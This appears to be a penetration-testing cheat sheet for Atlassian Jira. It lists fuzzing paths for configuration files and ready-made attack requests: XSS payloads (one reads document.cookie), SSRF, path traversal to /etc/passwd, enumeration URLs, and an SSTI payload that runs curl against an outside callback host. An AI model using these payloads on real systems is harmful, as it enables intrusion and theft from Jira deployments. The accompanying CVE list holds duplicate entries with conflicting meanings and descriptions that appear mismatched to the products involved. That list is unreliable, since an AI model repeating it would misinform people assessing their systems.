Jira Testing
Still ongoing updates 

#Fuzzing for jira 
/secure/ConfigurePortalPages!default.jspa?view=popular
/secure/ManageFilters.jspa?filterView=search&Search=Search&filterView=search&sortColumn=favcount&sortAscending=false
/secure/ContactAdministrators!default.jspa
/servicedesk/customer/user/login
/issues/?jql=
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://google.com
/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true
/plugins/servlet/gadgets/makeRequest?url=https://victomhost:1337@example.com
/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)
/secure/QueryComponent!Default.jspa
/secure/ViewUserHover.jspa
/ViewUserHover.jspa?username=Admin
/rest/api/2/dashboard?maxResults=100
/pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert(‘XSS’)%22%3E.vm
/rest/api/2/user/picker?query=admin
/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
/rest/api/2/user/picker?query=admin
/s/
/plugins/servlet/oauth/users/icon-uri?consumerUri=https://www.google.nl
/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(1)%3C%2fscript%3Et1nmk&Search=Search
ConfigurePortalPages.jspa
/plugins/servlet/Wallboard/?dashboardId=10100&dashboardId=10101&cyclePeriod=(function(){alert(document.cookie);return%2030000;})()&transitionFx=none&random=true
/_/;/WEB-INF/web.xml
/_/;/WEB-INF/decorators.xml
/_/;/WEB-INF/classes/seraph-config.xml
/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties
/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.xml
/_/;/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
/_/;/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties
/_/%3B/WEB-INF/web.xml
/_/%3B/WEB-INF/decorators.xml
/_/%3B/WEB-INF/classes/seraph-config.xml
/_/%3B/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties
/_/%3B/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.xml
/_/%3B/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
/_/%3B/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties


#Some Common JIRA CVE's 
CVE-2023-22501 - Critical authentication vulnerability in Jira Service Management, allowing unauthorized access.
CVE-2022-0540 - A critical flaw enabling remote code execution via deserialization issues.
CVE-2022-26136 & CVE-2022-26137 - Issues involving improper authorization, leading to potential privilege escalation and session hijacking.
CVE-2023-22515 - An authentication bypass issue in certain versions of Jira, exploitable by attackers for unauthorized access.
CVE-2023-22522 & CVE-2023-22523 - Both involve vulnerabilities that can lead to privilege escalation via manipulation of session tokens.
CVE-2024-37768 - Recent privilege escalation vulnerability in Jira affecting various Data Center and Server versions.
CVE-2023-22518 - A security flaw leading to potential denial-of-service (DoS) attacks on Jira instances.
CVE-2022-26138 - Issue involving hardcoded credentials in Atlassian apps, leading to unauthorized access.
CVE-2022-26134 - An exploited vulnerability allowing arbitrary code execution in Jira.
CVE-2022-36804 - Another critical flaw leading to unauthorized actions, particularly through script vulnerabilities.
CVE-2022-43782 - Exploitable flaw causing improper access controls, which could allow unauthorized access to Jira configurations.
CVE-2024-34750 - An issue with Apache Tomcat integration impacting Jira, potentially leading to data breaches.
CVE-2023-22524 - Another critical issue that can be used to exploit service management setups within Jira.
CVE-2023-22527 - A vulnerability that can be used to escalate privileges in specific Jira configurations.
CVE-2024-29857 - A vulnerability due to integration with Bouncy Castle libraries, affecting performance and security.
CVE-2022-1471 - Denial-of-service vulnerability through improper request handling.
CVE-2023-22513 - RCE vulnerability in related Atlassian products which might impact Jira integrations.
CVE-2021-44228 & CVE-2021-45046 - Log4j vulnerabilities affecting numerous Atlassian products, including Jira.
CVE-2021-42574 - Unicode-based security issue impacting encoding and input handling.
CVE-2022-0540 - A flaw impacting communication between Jira and other Atlassian products, leading to unauthorized actions.
CVE-2019-13990 - Historic vulnerability affecting older Jira versions, showcasing the need for continuous updates.
CVE-2023-46604 - Exploit related to session management in Jira products.
CVE-2024-21689 - Related to Bouncy Castle integration, highlighting resource exhaustion issues.
CVE-2021-45046 - Addressing memory leak and execution issues.
CVE-2023-22514 - Weaknesses in authentication protocols leading to unauthorized data exposure.
CVE-2023-22516 - Vulnerability involving potential unauthorized configuration access.
CVE-2022-26129 - Exploit path involving session hijacking.
CVE-2022-36807 - Security issue allowing improper execution of scripts.
CVE-2022-26135 - Critical vulnerability potentially leading to unauthorized code execution.
CVE-2023-22517 - Highlighted for its potential in network exploitation via improper permissions.



#CVE-2019-8449
https://jira.atlassian.com/browse/JRASERVER-69796
https://victomhost/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true

#CVE-2019-8451:ssrf-response-body
https://jira.atlassian.com/browse/JRASERVER-69793?jql=labels%20%3D%20
https://victomhost/plugins/servlet/gadgets/makeRequest?url=https://victomhost:1337@example.com

#RCE Jira=CVE-2019–11581
https://hackerone.com/reports/706841
/secure/ContactAdministrators!default.jspa

#CVE-2018-20824
https://victomhost/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)

#CVE-2020-14179
REF=https://jira.atlassian.com/browse/JRASERVER-71536
https://victomhost/secure/QueryComponent!Default.jspa

#CVE-2020-14181
Ref=https://jira.atlassian.com/browse/JRASERVER-71560?jql=text%20~%20%22cve-2020-14181%22
https://victomhost/secure/ViewUserHover.jspa
https://victomhost/ViewUserHover.jspa?username=Admin
https://hackerone.com/reports/380354

#CVE-2018-5230
https://jira.atlassian.com/browse/JRASERVER-67289
https://host/issues/?filter=-8

#CVE-2019-3403
https://jira.atlassian.com/browse/JRASERVER-69242
/rest/api/2/user/picker?query=admin

#CVE-2019-8442
https://jira.atlassian.com/browse/JRASERVER-69241
/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
/rest/api/2/user/picker?query=admin
/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml

#CVE-2017-9506
https://blog.csdn.net/caiqiiqi/article/details/89017806
/plugins/servlet/oauth/users/icon-uri?consumerUri=https://google.nl

#CVE-2019-3402：[Jira]XSS in the labels gadget
/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(1)%3C%2fscript%3Et1nmk&Search=Search
ConfigurePortalPages.jspa

#CVE-2018-20824：[Jira]XSS in WallboardServlet through the cyclePeriod parameter
/plugins/servlet/Wallboard/?dashboardId=10100&dashboardId=10101&cyclePeriod=(function(){alert(document.cookie);return%2030000;})()&transitionFx=none&random=true

#CVE-2019-3396: [Path Traversal & RCE]
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: JIRA
...
{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler(.)com/v/23464dc5","width":"1000","height":"1000","_template":"file:///etc/passwd"},"body":""}}

#CVE-2019-11581: [SSTI]
http://<JIRA>/secure/ContactAdministrators!default.jspa
#Try SSTI payload in subject and/or body:
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://xyz.burp(.)net').waitFor()

#CVE-2020-14178: [Project Key Enum]
http://<JIRA>/browse.<PROJECTKEY>

#CVE-2020-36289: [Username Enumeration]
https://<JIRA>/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin

#jira-unauthenticated-dashboards:
https://<JIRA>/rest/api/2/dashboard?maxResults=100

#jira-unauth-popular-filters:
https://<JIRA>/secure/ManageFilters.jspa?filterView=popular


#Few links for Jira 
1. https://parasarora06.medium.com/cve-2018-5230-jira-cross-site-scripting-59ec96b3d75f
2.https://medium.com/spark1-us/secret-scanner-for-jira-and-confluence-cve-2023-22515-defense-in-depth-ce30f10a7661
3. https://logicbomb.medium.com/bugbounty-nasa-internal-user-and-project-details-are-out-2f2e3580421b
4. https://logicbomb.medium.com/one-misconfig-jira-to-leak-them-all-including-nasa-and-hundreds-of-fortune-500-companies-a70957ef03c7
5. https://github.com/anmolksachan/JIRAya
6. https://www.tenable.com/plugins/nessus/73273
7. https://krevetk0.medium.com/two-easy-rce-in-atlassian-products-e8480eacdc7f
8. https://hackerone.com/reports/632808
9. https://www.acunetix.com/vulnerabilities/web/atlassian-jira-servicedesk-misconfiguration/
10. https://medium.com/tenable-techblog/exploiting-jira-for-host-discovery-43be3cddf023
